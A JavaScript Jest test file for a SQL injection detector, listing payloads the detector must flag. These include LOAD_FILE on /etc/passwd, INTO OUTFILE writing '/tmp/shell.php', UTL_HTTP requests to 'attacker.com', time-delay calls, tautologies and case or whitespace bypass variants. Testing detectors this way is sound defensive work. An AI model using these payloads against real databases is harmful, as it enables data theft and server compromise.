const sqliDetector = require('../src/detectors/sqli');

describe('SQLi Deep Auditor Tests', () => {
  const detect = (payload) => {
    const signals = sqliDetector.getSignals();
    return signals.some(s => {
      if (s.pattern) return s.pattern.test(payload);
      if (s.test) return s.test(payload);
      return false;
    });
  };

  test('Error-based SQLi: CAST with SELECT', () => {
    expect(detect('CAST((SELECT @@version) AS INT)')).toBe(true);
    expect(detect('CAST((SELECT password FROM users) AS VARCHAR)')).toBe(true);
    expect(detect('CaSt ( ( SeLeCt @@version) AS int )')).toBe(true);
  });

  test('Error-based SQLi: CONVERT with SELECT', () => {
    expect(detect('CONVERT(INT, (SELECT @@version))')).toBe(true);
    expect(detect('CoNvErT ( int , ( SeLeCt 1))')).toBe(true);
  });

  test('Out-of-band SQLi: LOAD_FILE', () => {
    expect(detect('SELECT LOAD_FILE(\'/etc/passwd\')')).toBe(true);
    expect(detect('lOaD_fIlE ( "C:\\boot.ini" )')).toBe(true);
  });

  test('Out-of-band SQLi: INTO OUTFILE', () => {
    expect(detect('SELECT * FROM users INTO OUTFILE \'/tmp/shell.php\'')).toBe(true);
    expect(detect('SELECT 1 INTO DUMPFILE \'a.txt\'')).toBe(true);
    expect(detect('InTo  OuTfIlE')).toBe(true);
  });

  test('Out-of-band SQLi: UTL_HTTP and UTL_INADDR', () => {
    expect(detect('UTL_HTTP.REQUEST(\'http://attacker.com\')')).toBe(true);
    expect(detect('UTL_INADDR.GET_HOST_ADDRESS(\'attacker.com\')')).toBe(true);
  });

  test('Time-delay SQLi: DBMS_PIPE', () => {
    expect(detect('DBMS_PIPE.RECEIVE_MESSAGE(\'a\', 10)')).toBe(true);
  });

  test('Time-delay SQLi: PG_SLEEP and BENCHMARK', () => {
    expect(detect('PG_SLEEP(10)')).toBe(true);
    expect(detect('BENCHMARK(1000000, MD5(1))')).toBe(true);
  });

  test('Bypass variants: Case mixing', () => {
    expect(detect('uNiOn SeLeCt 1, 2')).toBe(true);
    expect(detect('sElEcT pG_sLeEp(5)')).toBe(true);
    expect(detect('dRoP tAbLe users')).toBe(true);
  });

  test('Bypass variants: Unicode and whitespace', () => {
    expect(detect('UNION\xA0SELECT\xA01')).toBe(true);
    expect(detect('UNION\tSELECT\t1')).toBe(true);
  });

  const bypassPayloads = [
    '1; WAITFOR DELAY \'0:0:10\'--',
    '1\'; WAITFOR DELAY \'0:0:10\'--',
    '1"; WAITFOR DELAY \'0:0:10\'--',
    '1\xA0UNION\xA0SELECT\xA0password\xA0FROM\xA0users',
    '1\tUNION\tSELECT\tpassword\tFROM\tusers',
    '1\nUNION\nSELECT\npassword\nFROM\nusers',
    '1\rUNION\rSELECT\rpassword\rFROM\rusers',
    'CAST((SELECT @@version) AS INT)',
    'cAsT((SeLeCt @@version) As InT)',
    'CONVERT(INT, (SELECT @@version))',
    'cOnVeRt(InT, (SeLeCt @@version))',
    'LOAD_FILE(\'/etc/passwd\')',
    'lOaD_fIlE(\'/etc/passwd\')',
    'SELECT * INTO OUTFILE \'/tmp/shell.php\'',
    'sElEcT * iNtO oUtFiLe \'/tmp/shell.php\'',
    'UTL_HTTP.REQUEST(\'http://attacker.com\')',
    'uTl_HtTp.ReQuEsT(\'http://attacker.com\')',
    'DBMS_PIPE.RECEIVE_MESSAGE(\'a\', 10)',
    'dBmS_pIpE.rEcEiVe_MeSsAgE(\'a\', 10)',
    'PG_SLEEP(10)',
    'pG_sLeEp(10)',
    'BENCHMARK(1000000, MD5(1))',
    'bEnChMaRk(1000000, Md5(1))',
    '\' OR 1=1--',
    '" OR 1=1--',
    '1 OR 1=1--',
    '1\' || 1=1--',
    '1" || 1=1--',
    '1 && 1=1--',
    '1\' && 1=1--'
  ];

  bypassPayloads.forEach((payload, index) => {
    test(`Bypass payload ${index + 1}: ${payload}`, () => {
      expect(detect(payload)).toBe(true);
    });
  });
});
